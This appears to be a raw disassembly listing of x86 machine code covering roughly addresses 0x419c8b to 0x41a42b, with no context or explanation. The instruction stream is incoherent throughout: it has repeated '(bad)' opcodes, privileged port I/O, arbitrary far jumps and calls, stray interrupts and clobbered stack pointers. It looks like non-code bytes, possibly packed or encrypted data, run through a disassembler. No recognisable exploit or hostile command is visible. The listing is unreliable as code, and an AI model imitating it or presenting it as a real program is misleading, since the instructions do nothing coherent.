  419c8b:	mov    cl,0x7d
  419c8d:	inc    ebx
  419c8e:	ds jg  0x419c8d
  419c91:	out    0x95,eax
  419c93:	xor    BYTE PTR [ebp-0x7c],bl
  419c96:	loopne 0x419ca5
  419c98:	mov    esp,0x2148f607
  419c9d:	inc    esp
  419c9e:	mov    cl,0xd9
  419ca0:	xchg   ebp,eax
  419ca1:	push   cs
  419ca2:	adc    BYTE PTR [eax],bl
  419ca4:	(bad)  
  419ca5:	fcmovnbe st,st(1)
  419ca7:	fstp   TBYTE PTR [ecx]
  419ca9:	mov    al,gs:0x6866538d
  419caf:	xchg   ebp,eax
  419cb0:	inc    ebp
  419cb1:	outs   dx,DWORD PTR ds:[esi]
  419cb2:	out    0x4c,eax
  419cb4:	cwde   
  419cb5:	mov    bh,0x4f
  419cb7:	ins    DWORD PTR es:[edi],dx
  419cb8:	aam    0xfb
  419cba:	inc    edi
  419cbb:	int    0x58
  419cbd:	mov    edi,0x4b8eef4d
  419cc2:	imul   eax,DWORD PTR [ebp+0x2e689cf9],0x15744221
  419ccc:	xchg   esp,eax
  419ccd:	push   0x23e160a9
  419cd2:	nop
  419cd3:	fst    st(6)
  419cd5:	jns    0x419cae
  419cd7:	jmp    0x6f46:0x71e5817d
  419cde:	xchg   esp,eax
  419cdf:	mov    edx,0x1f9b4991
  419ce4:	xchg   edi,eax
  419ce5:	es cmp bl,BYTE PTR ss:[eax+eax*1]
  419cea:	sub    bl,bl
  419cec:	dec    eax
  419ced:	dec    edi
  419cee:	sub    BYTE PTR [edx+esi*2+0x74cef30d],dl
  419cf5:	idiv   DWORD PTR [ebx-0x1]
  419cf8:	and    al,0xa8
  419cfa:	inc    edx
  419cfb:	or     BYTE PTR [edx+0x5d8793c5],dh
  419d01:	jle    0x419cfb
  419d03:	adc    bh,BYTE PTR [edi+0x4c]
  419d06:	popa   
  419d07:	mov    bh,0x32
  419d09:	inc    edx
  419d0a:	pop    esp
  419d0b:	mov    eax,ds:0xb3dcc874
  419d10:	and    dl,ah
  419d12:	jo     0x419d05
  419d14:	cmp    al,al
  419d16:	std    
  419d17:	dec    edx
  419d18:	icebp  
  419d19:	mov    bl,0x4c
  419d1b:	mov    edi,0xa3e33edf
  419d20:	jl     0x419d22
  419d22:	dec    edx
  419d23:	pop    ebx
  419d24:	mov    ?,WORD PTR [edx]
  419d26:	jnp    0x419cab
  419d28:	call   0xe5d868c3
  419d2d:	mov    al,0x7
  419d2f:	xchg   ah,al
  419d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d32:	shl    BYTE PTR [ebx+0x1c],0x1
  419d36:	lock mov ?,esp
  419d39:	neg    DWORD PTR [edi+ebx*2-0x32]
  419d3d:	mov    ch,0x2
  419d3f:	cmp    BYTE PTR [edi-0x78313fbb],al
  419d45:	js     0x419d8c
  419d47:	repnz popf 
  419d49:	ret    
  419d4a:	jne    0x419d0f
  419d4c:	fld    TBYTE PTR [edx+0x2b]
  419d4f:	push   es
  419d50:	cmp    BYTE PTR [esi-0x546473be],0xec
  419d57:	mov    edi,0xf3af2ac4
  419d5c:	mov    eax,0x17823350
  419d61:	pop    esp
  419d62:	xchg   esi,eax
  419d63:	push   0x8
  419d65:	pop    esi
  419d66:	rol    DWORD PTR [ecx+0x674b6c3d],cl
  419d6c:	jbe    0x419d3c
  419d6e:	fcomp  DWORD PTR [ebx+ebp*4+0x1f2667ee]
  419d75:	and    dl,BYTE PTR [edi+0x26b55598]
  419d7b:	lock or ecx,DWORD PTR [esi-0x46643a4e]
  419d82:	and    BYTE PTR [edi+edx*8],bh
  419d85:	and    ebx,esi
  419d87:	and    esp,DWORD PTR [esi]
  419d89:	mov    al,0xe3
  419d8b:	xor    al,0xe7
  419d8d:	leave  
  419d8e:	and    ch,dl
  419d90:	sbb    eax,0x5c720410
  419d95:	lock xchg eax,esp
  419d98:	and    eax,0x3571777e
  419d9d:	pusha  
  419d9e:	popf   
  419d9f:	bound  ecx,QWORD PTR [ebx]
  419da1:	in     al,dx
  419da2:	je     0x419d6d
  419da4:	xor    al,0x76
  419da6:	in     eax,dx
  419da7:	jno    0x419df7
  419da9:	fwait
  419daa:	pop    edi
  419dab:	test   BYTE PTR [ebx+0x1a],dh
  419dae:	int3   
  419daf:	pop    es
  419db0:	jle    0x419e2e
  419db2:	out    0xe6,al
  419db4:	out    0x48,al
  419db6:	and    DWORD PTR [ebx+0x5c79ec08],edx
  419dbc:	cmp    BYTE PTR [ecx+0x1f9f334],ch
  419dc2:	cld    
  419dc3:	xor    DWORD PTR [edx],ecx
  419dc5:	fdiv   DWORD PTR [ebx]
  419dc7:	sahf   
  419dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc9:	pop    ds
  419dca:	jmp    0x7e7c:0x877c5a39
  419dd1:	(bad)  [edx]
  419dd3:	push   es
  419dd4:	pop    ecx
  419dd5:	mov    ds:0x5ee87606,eax
  419dda:	ins    DWORD PTR es:[edi],dx
  419ddb:	add    dh,BYTE PTR [ecx+0x28]
  419dde:	les    ecx,FWORD PTR [ecx+0x72]
  419de1:	test   eax,0xb96ca556
  419de6:	and    edi,eax
  419de8:	lea    ecx,[eax+0x701f1ea9]
  419dee:	jmp    DWORD PTR [ebx-0x5e12f318]
  419df4:	std    
  419df5:	dec    edx
  419df6:	xor    BYTE PTR [ebx-0x2a],bh
  419df9:	add    eax,0x1cfd5b08
  419dfe:	sub    esi,DWORD PTR [eax+0x1b]
  419e01:	daa    
  419e02:	std    
  419e03:	mov    ch,0xc2
  419e05:	shl    DWORD PTR [ebp-0x2a7e68ec],cl
  419e0b:	lds    ebx,FWORD PTR [edi-0x14e2552b]
  419e11:	in     eax,dx
  419e12:	inc    ecx
  419e13:	into   
  419e14:	dec    ebp
  419e15:	pop    ebx
  419e16:	push   cs
  419e17:	stc    
  419e18:	pusha  
  419e19:	and    al,0x89
  419e1b:	xor    ch,bh
  419e1d:	fstp   DWORD PTR [edi]
  419e1f:	push   esp
  419e20:	pop    es
  419e21:	btc    DWORD PTR [edx],esi
  419e24:	ss loope 0x419de1
  419e27:	jns    0x419e7a
  419e29:	xchg   ebp,eax
  419e2a:	jno    0x419e75
  419e2c:	push   0x1355e672
  419e31:	into   
  419e32:	fld    QWORD PTR ds:0x1ce7086e
  419e38:	jle    0x419df0
  419e3a:	jns    0x419de2
  419e3c:	xchg   edi,eax
  419e3d:	xchg   ecx,eax
  419e3e:	aas    
  419e3f:	out    dx,eax
  419e40:	add    ebx,edx
  419e42:	push   0xc2d615c7
  419e47:	and    ebx,ebp
  419e49:	loop   0x419eaf
  419e4b:	add    eax,0x9933422a
  419e50:	xchg   esi,eax
  419e51:	pop    ebp
  419e52:	stc    
  419e53:	jnp    0x419e38
  419e55:	adc    bl,BYTE PTR [eax+edi*1-0x2331b7df]
  419e5c:	fwait
  419e5d:	mov    ebp,0xbe8c9f08
  419e62:	xchg   edx,eax
  419e63:	xchg   ebp,eax
  419e64:	sbb    BYTE PTR [ebx],0xbc
  419e67:	rol    DWORD PTR [edi-0x7],cl
  419e6a:	push   ecx
  419e6b:	test   eax,0x7a6c57bb
  419e70:	pop    ebp
  419e71:	mov    al,ds:0xb8c99728
  419e76:	lea    esp,[eax+0x1f6b4e89]
  419e7c:	xchg   ebp,eax
  419e7d:	idiv   edx
  419e7f:	mov    ds:0x64ec30c6,al
  419e84:	adc    ebp,ebp
  419e86:	mov    ch,0x97
  419e88:	fbld   TBYTE PTR [ebp+0x5c]
  419e8b:	lods   al,BYTE PTR ds:[esi]
  419e8c:	fild   DWORD PTR [ebx-0x5b]
  419e8f:	data16 gs sahf 
  419e92:	push   cs
  419e93:	mov    al,ds:0x56bb8dfd
  419e98:	dec    edi
  419e9a:	pop    eax
  419e9b:	call   0x5941c0a7
  419ea0:	jns    0x419e72
  419ea2:	xchg   esi,eax
  419ea3:	je     0x419e50
  419ea5:	scas   eax,DWORD PTR es:[edi]
  419ea6:	data16 into 
  419ea8:	jae    0x38036191
  419eae:	cmp    ah,cl
  419eb0:	push   esp
  419eb1:	push   cs
  419eb2:	mov    WORD PTR [eax],cs
  419eb4:	call   0x9367:0x69736ca7
  419ebb:	push   cs
  419ebc:	or     ch,ch
  419ebe:	and    ebp,0x7770244d
  419ec4:	and    eax,0x849b0175
  419ec9:	sub    eax,0x55a6d729
  419ece:	xor    ecx,edx
  419ed0:	pop    ss
  419ed1:	cmp    eax,0x953f66dc
  419ed6:	shr    BYTE PTR [ebx-0x43],0x54
  419eda:	lahf   
  419edb:	xchg   DWORD PTR [ebx+0x74d3e82e],ecx
  419ee1:	dec    ebp
  419ee2:	dec    edx
  419ee3:	popf   
  419ee4:	or     BYTE PTR [eax+0x3d369e86],bh
  419eea:	push   ebx
  419eeb:	lods   eax,DWORD PTR ds:[esi]
  419eec:	fcom   DWORD PTR [eax+0x50a8d6eb]
  419ef2:	fild   QWORD PTR [eax+edi*2]
  419ef5:	int    0x87
  419ef7:	fwait
  419ef8:	out    0x2d,eax
  419efa:	mov    ecx,0x3e12dbf2
  419eff:	adc    dh,ah
  419f01:	adc    ch,ch
  419f03:	cld    
  419f04:	and    eax,0x38fb8d16
  419f09:	pop    ds
  419f0a:	xor    ebp,ebx
  419f0c:	sbb    eax,0x7fce02ed
  419f11:	pop    esi
  419f12:	pusha  
  419f13:	ss in  al,0x5e
  419f16:	dec    esp
  419f17:	retf   0xffaf
  419f1a:	mul    ch
  419f1c:	inc    esp
  419f1d:	jecxz  0x419f46
  419f1f:	push   esi
  419f20:	add    al,0x1a
  419f22:	jnp    0x419ede
  419f24:	push   ebx
  419f25:	int3   
  419f26:	out    0x1d,al
  419f28:	mov    esi,0x973f58bb
  419f2d:	jno    0x419eda
  419f2f:	inc    esp
  419f30:	xlat   BYTE PTR ds:[ebx]
  419f31:	sti    
  419f32:	cmp    BYTE PTR [edi+0x12338403],ah
  419f38:	pop    ecx
  419f39:	xchg   ebx,eax
  419f3a:	jp     0x419f11
  419f3c:	pop    esp
  419f3d:	xacquire xchg DWORD PTR [edx+0x26],ebx
  419f41:	or     dh,al
  419f43:	shl    BYTE PTR [esi+0x3],cl
  419f46:	pop    eax
  419f47:	sub    eax,0x9624808e
  419f4c:	cs sub al,0x0
  419f4f:	stc    
  419f50:	dec    esp
  419f51:	add    bl,cl
  419f53:	push   0xd3f5764
  419f58:	das    
  419f59:	xchg   esi,eax
  419f5a:	mov    ds:0xdc370088,al
  419f5f:	inc    edi
  419f60:	(bad)  
  419f62:	test   BYTE PTR [ebx+0x1bf7ac9b],dh
  419f68:	leave  
  419f69:	nop
  419f6a:	idiv   BYTE PTR es:[edi]
  419f6d:	movlps xmm4,QWORD PTR [edx-0x59]
  419f71:	pop    es
  419f72:	lods   al,BYTE PTR ds:[esi]
  419f73:	pop    dx
  419f75:	(bad)  
  419f76:	in     al,0xb6
  419f78:	ret    0xb44b
  419f7b:	push   ecx
  419f7c:	xlat   BYTE PTR ds:[ebx]
  419f7d:	popf   
  419f7e:	mov    edi,DWORD PTR [esi+0x73]
  419f81:	into   
  419f82:	rol    esp,0x35
  419f85:	ja     0x419ff5
  419f87:	test   BYTE PTR [ebx-0x18c7ee6f],0x30
  419f8e:	mov    esp,0xeedd6f6a
  419f93:	retf   0x6eb2
  419f96:	cmp    dl,ah
  419f98:	push   edi
  419f99:	pop    esi
  419f9a:	sub    edi,ebx
  419f9c:	sbb    esp,DWORD PTR [ebx+0x1a4db76b]
  419fa2:	mov    edx,0xbcee3840
  419fa7:	mov    DWORD PTR [edx+edx*8-0x6860245a],ebx
  419fae:	jbe    0x41a003
  419fb0:	sbb    esp,DWORD PTR [esi+0x63feae06]
  419fb6:	popa   
  419fb7:	das    
  419fb8:	hlt    
  419fb9:	ins    DWORD PTR es:[edi],dx
  419fba:	adc    bh,cl
  419fbc:	in     al,dx
  419fbd:	ss cmp al,0x7c
  419fc0:	mov    WORD PTR [eax+ecx*2-0x15],fs
  419fc4:	inc    ecx
  419fc5:	popf   
  419fc6:	mov    ds:0x1a8adf01,al
  419fcb:	jmp    0xf9bb9de4
  419fd0:	ror    DWORD PTR [edx-0x66],cl
  419fd3:	jae    0x419fa1
  419fd5:	out    0xa5,al
  419fd7:	int    0x5e
  419fd9:	imul   edi,DWORD PTR [ecx],0x4d9d654e
  419fdf:	add    bh,BYTE PTR [ecx]
  419fe1:	fld    QWORD PTR [eax]
  419fe3:	sbb    BYTE PTR [esi+0x67f85db3],0x3d
  419fea:	sbb    bh,BYTE PTR [eax]
  419fec:	lods   al,BYTE PTR ds:[esi]
  419fed:	(bad)  
  419fee:	iret   
  419fef:	dec    eax
  419ff0:	add    eax,0xd857b869
  419ff5:	mov    al,ds:0x162f63a8
  419ffa:	push   0xfffffff8
  419ffc:	pop    eax
  419ffd:	sub    edx,DWORD PTR [ebx+eax*1-0x57]
  41a001:	ss popf 
  41a003:	jae    0x41a065
  41a005:	xchg   ecx,eax
  41a006:	xchg   ebx,ecx
  41a008:	mov    ds:0xda91c5a9,eax
  41a00d:	xchg   esi,eax
  41a00e:	(bad)  
  41a00f:	sbb    DWORD PTR [esi],0x86c30208
  41a015:	mov    dl,0x2d
  41a017:	mov    ebx,0xb09d61a5
  41a01c:	call   0xf395:0x2cfac3f
  41a023:	js     0x41a074
  41a025:	push   ss
  41a026:	sub    DWORD PTR [ebp+0x4e],ecx
  41a029:	mov    eax,0x6151a154
  41a02e:	push   ebx
  41a02f:	adc    BYTE PTR [eax+edi*8-0x7b2ae1c6],dh
  41a036:	sahf   
  41a037:	pop    edi
  41a038:	repz sub bh,BYTE PTR [eax-0x2dcc8a7]
  41a03f:	test   DWORD PTR [ebx],ebp
  41a041:	dec    edx
  41a042:	repz scas al,BYTE PTR es:[edi]
  41a044:	mov    dh,0x94
  41a046:	jecxz  0x419fe1
  41a048:	mov    DWORD PTR [ebx+0x4d4b27e5],edi
  41a04e:	dec    edx
  41a04f:	jbe    0x41a0b1
  41a051:	sbb    eax,0xd1b597c8
  41a056:	daa    
  41a057:	je     0x41a0b4
  41a059:	pusha  
  41a05a:	sub    BYTE PTR [edx+ebp*1+0x27],bl
  41a05e:	push   ds
  41a05f:	ret    
  41a060:	ret    0x4d98
  41a063:	aam    0xd1
  41a065:	sbb    BYTE PTR ds:[esi-0x43],al
  41a069:	cmp    edx,DWORD PTR [ebx+0x69]
  41a06c:	cmc    
  41a06d:	fistp  WORD PTR [ebp*8+0x2770f35b]
  41a074:	push   ebp
  41a075:	inc    esp
  41a076:	add    edx,DWORD PTR [esp+edi*8-0x36c92a9f]
  41a07d:	mov    ch,0xa9
  41a07f:	mov    ch,0x4d
  41a081:	daa    
  41a082:	and    DWORD PTR [esi+esi*2-0x236b9c1a],esp
  41a089:	mov    WORD PTR [ebx+0x37],cs
  41a08c:	push   ebx
  41a08d:	xchg   DWORD PTR [ebx+0x67cfba16],ecx
  41a093:	push   cs
  41a094:	add    al,0xf4
  41a096:	retf   0xee11
  41a099:	and    DWORD PTR [esi-0x7b],eax
  41a09c:	retf   0x2deb
  41a09f:	add    eax,0x13aec6d5
  41a0a4:	xchg   ebx,eax
  41a0a5:	ins    DWORD PTR es:[edi],dx
  41a0a6:	push   ebx
  41a0a7:	jmp    0x41a0aa
  41a0a9:	test   BYTE PTR [edx],ah
  41a0ab:	stos   BYTE PTR es:[edi],al
  41a0ac:	cmp    ch,dh
  41a0ae:	shl    BYTE PTR [ebx+0x45],0x8d
  41a0b2:	cmp    al,0xde
  41a0b4:	popf   
  41a0b5:	inc    esp
  41a0b6:	repnz push ebp
  41a0b8:	dec    esi
  41a0b9:	xor    bl,BYTE PTR [ebx]
  41a0bb:	xor    BYTE PTR ds:0x5a614812,dh
  41a0c1:	xor    ebp,ecx
  41a0c3:	xchg   edx,ecx
  41a0c5:	popa   
  41a0c6:	xor    BYTE PTR [eax+0x67],0x2a
  41a0ca:	add    eax,0x6a634c0a
  41a0cf:	xchg   edi,eax
  41a0d0:	xchg   ecx,edi
  41a0d2:	in     al,dx
  41a0d3:	das    
  41a0d4:	bound  ecx,QWORD PTR [ebx-0x69]
  41a0d7:	pop    ebp
  41a0d8:	pop    es
  41a0d9:	lods   eax,DWORD PTR ds:[esi]
  41a0da:	jns    0x41a0dd
  41a0dc:	scas   al,BYTE PTR es:[edi]
  41a0dd:	jno    0x41a0f4
  41a0df:	mov    dl,BYTE PTR [ebx-0x7b]
  41a0e2:	mov    esi,0x1e061778
  41a0e7:	cli    
  41a0e8:	jmp    0x41a163
  41a0ea:	or     al,0x95
  41a0ec:	cmp    DWORD PTR [ebx],edx
  41a0ee:	sub    al,0xe1
  41a0f0:	leave  
  41a0f1:	outs   dx,DWORD PTR ds:[esi]
  41a0f2:	rol    DWORD PTR [edi],cl
  41a0f4:	cdq    
  41a0f5:	push   es
  41a0f6:	push   ds
  41a0f7:	inc    eax
  41a0f8:	sub    al,0x81
  41a0fa:	pop    ebx
  41a0fb:	cmc    
  41a0fc:	rcr    ch,1
  41a0fe:	stos   DWORD PTR es:[edi],eax
  41a0ff:	xor    eax,0x1bbe312c
  41a104:	push   edi
  41a105:	rcr    BYTE PTR [ecx-0x7a],cl
  41a108:	outs   dx,BYTE PTR ds:[esi]
  41a109:	push   ecx
  41a10a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a10c:	mov    esp,0xc413a1cd
  41a111:	mov    ebp,0x1ffb5b6
  41a116:	popa   
  41a117:	push   eax
  41a118:	and    eax,0x24d7ba7b
  41a11d:	out    0xf1,al
  41a11f:	cdq    
  41a120:	xchg   ebx,eax
  41a121:	call   DWORD PTR [eax-0x27]
  41a124:	pop    esi
  41a125:	or     eax,0x2dfaa662
  41a12a:	arpl   WORD PTR [ebx],bp
  41a12c:	inc    edi
  41a12d:	and    DWORD PTR [ebx],ebx
  41a12f:	xlat   BYTE PTR ds:[ebx]
  41a130:	fucomi st,st(5)
  41a132:	lahf   
  41a133:	arpl   dx,sp
  41a135:	ret    
  41a136:	xchg   esp,eax
  41a137:	push   ecx
  41a138:	js     0x41a0c7
  41a13a:	or     ah,BYTE PTR [ebp+0x42]
  41a13d:	pop    eax
  41a13e:	js     0x41a1b8
  41a140:	psraw  mm6,mm2
  41a143:	les    ecx,FWORD PTR [ebp-0x37]
  41a146:	pop    es
  41a147:	add    edx,0xffffff8f
  41a14a:	sbb    BYTE PTR [esi-0x2a9144d],dl
  41a150:	push   esi
  41a151:	or     eax,0x341b7def
  41a156:	sbb    al,0x3a
  41a158:	jb     0x41a1c4
  41a15a:	or     dl,dl
  41a15c:	and    DWORD PTR [edx-0x6b],edi
  41a15f:	arpl   WORD PTR [edx+edx*8-0x4d315276],ax
  41a166:	ficom  DWORD PTR [edx-0x4f]
  41a169:	sub    DWORD PTR [esi],esp
  41a16b:	push   edx
  41a16c:	ja     0x41a15a
  41a16e:	sub    ebp,DWORD PTR [edx-0x49b3c75e]
  41a174:	mov    edx,0x5bca0796
  41a179:	outs   dx,DWORD PTR ds:[esi]
  41a17a:	xor    edi,DWORD PTR [esi]
  41a17c:	cmp    eax,0xbbb3375
  41a181:	adc    eax,0x3a8a16a7
  41a186:	enterw 0xb415,0xf5
  41a18b:	pop    edi
  41a18c:	xor    BYTE PTR [ebx-0x5416859f],ah
  41a192:	stos   DWORD PTR es:[edi],eax
  41a193:	(bad)  
  41a194:	lods   eax,DWORD PTR ds:[esi]
  41a195:	out    dx,eax
  41a196:	mov    ebx,0x5a3560fd
  41a19b:	cwde   
  41a19c:	sahf   
  41a19d:	sbb    al,0x4d
  41a19f:	in     al,dx
  41a1a0:	test   al,0x1c
  41a1a2:	dec    ebx
  41a1a3:	pop    ecx
  41a1a4:	loope  0x41a178
  41a1a6:	addr16 jns 0x41a1f8
  41a1a9:	into   
  41a1aa:	inc    edi
  41a1ab:	mov    bl,BYTE PTR [edi-0x3f40ddb6]
  41a1b1:	std    
  41a1b2:	clc    
  41a1b3:	mov    edi,0x36785119
  41a1b8:	je     0x41a157
  41a1ba:	xchg   ebp,eax
  41a1bb:	aad    0xdc
  41a1bd:	sbb    al,0xd6
  41a1bf:	out    0xc4,eax
  41a1c1:	lahf   
  41a1c2:	add    DWORD PTR [esi+0x2166f5b3],edi
  41a1c8:	mov    DWORD PTR [ebp+0x76],ebx
  41a1cb:	adc    ebx,DWORD PTR [ebx+0x245f18b5]
  41a1d1:	clc    
  41a1d2:	test   ch,0xd5
  41a1d5:	mov    ecx,0xbf4231c8
  41a1da:	xchg   edx,eax
  41a1db:	xor    esi,0x2c
  41a1de:	call   0x236f:0x9f046eac
  41a1e5:	mov    ds:0xa2a08ef8,al
  41a1ea:	lahf   
  41a1eb:	outs   dx,DWORD PTR ds:[esi]
  41a1ec:	aad    0x8b
  41a1ee:	loope  0x41a183
  41a1f0:	jo     0x41a22f
  41a1f2:	pop    esp
  41a1f3:	mov    ebx,0x4e48b464
  41a1f8:	push   ebx
  41a1f9:	adc    BYTE PTR [ebp-0x26f7c667],cl
  41a1ff:	sbb    eax,0x459bceeb
  41a204:	dec    ecx
  41a205:	fcomip st,st(6)
  41a207:	mov    ch,0x20
  41a209:	cmp    DWORD PTR [esp+eiz*2+0x60],0xffffff92
  41a20e:	push   ebp
  41a20f:	dec    esp
  41a210:	push   ebx
  41a211:	into   
  41a212:	xlat   BYTE PTR ds:[ebx]
  41a213:	lods   al,BYTE PTR ds:[esi]
  41a214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a215:	xor    DWORD PTR [esi+eiz*2+0x7962d1eb],edx
  41a21c:	(bad)  
  41a21d:	jne    0x41a244
  41a21f:	lods   al,BYTE PTR ds:[esi]
  41a220:	jnp    0x41a220
  41a222:	dec    edi
  41a223:	fild   WORD PTR [ebx-0x6c]
  41a226:	jmp    0xf8a9:0x53642dd4
  41a22d:	xor    esi,ecx
  41a22f:	push   es
  41a230:	push   esp
  41a231:	mov    ch,0xaf
  41a233:	sar    BYTE PTR [edx+0x2cd86d01],1
  41a239:	pop    ebp
  41a23a:	les    eax,FWORD PTR [edx-0x13ba39f1]
  41a240:	cmp    eax,0x4a0ea043
  41a245:	aam    0x74
  41a247:	push   esi
  41a248:	pop    ebp
  41a249:	push   es
  41a24a:	or     BYTE PTR [eax],cl
  41a24c:	ficomp WORD PTR [esi-0x78]
  41a24f:	pop    esi
  41a250:	mov    edi,0x83c8fd54
  41a255:	and    DWORD PTR [ebx-0x79],esi
  41a258:	mov    edx,0xcba9a939
  41a25d:	and    al,0xef
  41a25f:	add    edx,DWORD PTR [ebx-0x6d]
  41a262:	add    edi,edx
  41a264:	jmp    0x41a213
  41a266:	xor    eax,DWORD PTR [esi-0x6b]
  41a269:	repz jmp 0x41a29c
  41a26c:	xor    eax,0xcb822e8f
  41a271:	repz and cl,BYTE PTR [edi+esi*8+0x41]
  41a276:	stos   DWORD PTR es:[edi],eax
  41a277:	outs   dx,DWORD PTR ds:[esi]
  41a278:	enter  0x7ce9,0x7f
  41a27c:	(bad)  
  41a27d:	push   ebp
  41a27e:	cmp    BYTE PTR [ecx+0x4bc85b0b],al
  41a284:	mov    edi,0x862273a5
  41a289:	sbb    eax,0x982312ac
  41a28e:	mov    DWORD PTR [ebx],ecx
  41a290:	jno    0x41a223
  41a292:	clc    
  41a293:	cmp    DWORD PTR [ebp+0x30],esp
  41a296:	push   edx
  41a297:	pop    ds
  41a298:	std    
  41a299:	cmp    DWORD PTR [esp+ecx*2],ebx
  41a29c:	pushf  
  41a29d:	pop    edx
  41a29e:	pop    ecx
  41a29f:	call   0xd112dfb7
  41a2a4:	popf   
  41a2a5:	idiv   DWORD PTR [ebx-0x439332ab]
  41a2ab:	jg     0x41a279
  41a2ad:	ret    
  41a2ae:	gs hlt 
  41a2b0:	in     eax,0x20
  41a2b2:	xor    BYTE PTR [esi],cl
  41a2b4:	lods   eax,DWORD PTR ds:[esi]
  41a2b5:	xlat   BYTE PTR ds:[ebx]
  41a2b6:	and    eax,0xc6fc7b70
  41a2bb:	and    DWORD PTR [esi+0x71],ebp
  41a2be:	push   edi
  41a2bf:	xlat   BYTE PTR ds:[ebx]
  41a2c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c1:	xchg   esi,eax
  41a2c2:	dec    esp
  41a2c3:	or     eax,0x3ebf6251
  41a2c8:	neg    dl
  41a2ca:	pop    esp
  41a2cb:	or     dh,BYTE PTR [edi]
  41a2cd:	cmp    al,0xd1
  41a2cf:	push   cs
  41a2d0:	and    dh,ch
  41a2d2:	lea    edi,[ecx]
  41a2d4:	imul   ebp,edi,0xa1e0382b
  41a2da:	loope  0x41a338
  41a2dc:	push   ebp
  41a2dd:	out    dx,al
  41a2de:	shl    dh,cl
  41a2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e1:	repnz pop esi
  41a2e3:	xchg   ebx,eax
  41a2e4:	pop    ecx
  41a2e5:	add    DWORD PTR [esi],ebx
  41a2e7:	aas    
  41a2e8:	jl     0x41a29c
  41a2ea:	or     DWORD PTR [ebp+0x9],0xdfd04932
  41a2f1:	add    al,0xac
  41a2f3:	fucomp st(7)
  41a2f5:	dec    ecx
  41a2f6:	xchg   edx,eax
  41a2f7:	call   0x70b0:0x1a450e05
  41a2fe:	(bad)  
  41a300:	aam    0x96
  41a302:	push   eax
  41a303:	pop    esp
  41a304:	sbb    esp,DWORD PTR [edi+0x46686148]
  41a30a:	sahf   
  41a30b:	dec    esi
  41a30c:	test   DWORD PTR [eax+ebx*4+0x69f1d3c8],0xc73ad344
  41a317:	push   edx
  41a318:	inc    edi
  41a319:	seta   BYTE PTR [ebp+0x74be457c]
  41a320:	inc    edi
  41a321:	call   0x9baa:0x4ed7dbe6
  41a328:	mov    esp,0x54ac5c28
  41a32d:	test   al,0x2
  41a32f:	loope  0x41a3ab
  41a331:	out    dx,al
  41a332:	adc    dl,BYTE PTR [esi+ecx*4]
  41a335:	addr16 push esp
  41a337:	ret    0x4ee8
  41a33a:	dec    ebp
  41a33b:	sbb    al,0xfe
  41a33d:	arpl   WORD PTR [ecx+0x83f9296],ax
  41a343:	in     eax,0x97
  41a345:	push   esp
  41a346:	mul    BYTE PTR [ebp-0x54]
  41a349:	lods   al,BYTE PTR ds:[esi]
  41a34a:	sub    DWORD PTR [ecx-0x5e127f51],edx
  41a350:	jmp    0x5db8:0xfde44688
  41a357:	ret    
  41a358:	mov    ebx,0xde903aba
  41a35d:	jnp    0x41a2f0
  41a35f:	add    al,0xa5
  41a361:	out    0xf7,al
  41a363:	test   al,0x48
  41a365:	add    DWORD PTR [esi-0x3],esp
  41a368:	stc    
  41a369:	popa   
  41a36a:	pusha  
  41a36b:	repz mov al,ds:0x55cce65e
  41a371:	mov    eax,0x9eb45f15
  41a376:	mov    DWORD PTR [ebx],ecx
  41a378:	rol    ebx,0xd
  41a37b:	adc    DWORD PTR [edx+ecx*4],esi
  41a37e:	push   ebx
  41a37f:	jle    0x41a3d0
  41a381:	pop    edi
  41a382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a383:	add    esp,esp
  41a385:	jmp    0x41a361
  41a387:	call   0x6c4ab622
  41a38c:	fs test al,0x43
  41a38f:	push   esi
  41a390:	cdq    
  41a391:	jmp    0x41a360
  41a393:	retf   
  41a394:	in     al,0x85
  41a396:	jnp    0x41a3d0
  41a398:	out    0x99,eax
  41a39a:	jg     0x41a3ca
  41a39c:	jnp    0x41a382
  41a39e:	ja     0x41a322
  41a3a0:	lods   eax,DWORD PTR ds:[esi]
  41a3a1:	mov    ebx,0xc37a5990
  41a3a6:	nop
  41a3a7:	xor    ebx,ebp
  41a3a9:	xchg   ebx,eax
  41a3aa:	jg     0x41a3ec
  41a3ac:	sub    eax,0xc4b6694e
  41a3b1:	lock mov edx,ecx
  41a3b4:	xlat   BYTE PTR ds:[ebx]
  41a3b5:	adc    eax,0x347fa4c0
  41a3ba:	jge    0x41a3d8
  41a3bc:	aad    0xe3
  41a3be:	dec    edi
  41a3bf:	enter  0x5b40,0x73
  41a3c3:	sub    bh,bl
  41a3c5:	stc    
  41a3c6:	jae    0x41a38b
  41a3c8:	dec    esi
  41a3c9:	popa   
  41a3ca:	pop    esi
  41a3cb:	or     eax,0x32016495
  41a3d0:	ror    BYTE PTR [edi-0x35b8518f],cl
  41a3d6:	fcom   st(7)
  41a3d8:	inc    DWORD PTR [esp+ecx*2-0x6f]
  41a3dc:	fwait
  41a3dd:	outs   dx,BYTE PTR ds:[esi]
  41a3de:	in     eax,dx
  41a3df:	inc    edx
  41a3e0:	push   ss
  41a3e1:	pop    es
  41a3e2:	sbb    bl,BYTE PTR [ebx]
  41a3e4:	int3   
  41a3e5:	jmp    0x5ed4e699
  41a3ea:	push   cs
  41a3eb:	repz jmp 0x41a41c
  41a3ee:	aam    0x54
  41a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f1:	call   0x2a584c6a
  41a3f6:	xchg   eax,edx
  41a3f8:	rcl    DWORD PTR [edx],0xe5
  41a3fb:	or     esi,esi
  41a3fd:	or     ah,BYTE PTR [eax-0x3f0dc513]
  41a403:	push   ds
  41a404:	mov    bl,0x35
  41a406:	inc    ebp
  41a407:	add    eax,0x55a0d3bf
  41a40c:	daa    
  41a40d:	or     al,0x3f
  41a40f:	retf   0x5aff
  41a412:	int    0x6
  41a414:	mov    eax,0xf5832cd3
  41a419:	test   BYTE PTR [esi-0x2c],cl
  41a41c:	addr16 ss jle 0x41a49c
  41a420:	test   BYTE PTR [ecx],bh
  41a422:	test   al,0x5b
  41a424:	popf   
  41a425:	push   0x1123eb2b
  41a42a:	daa    
  41a42b:	mov    dl,0x6
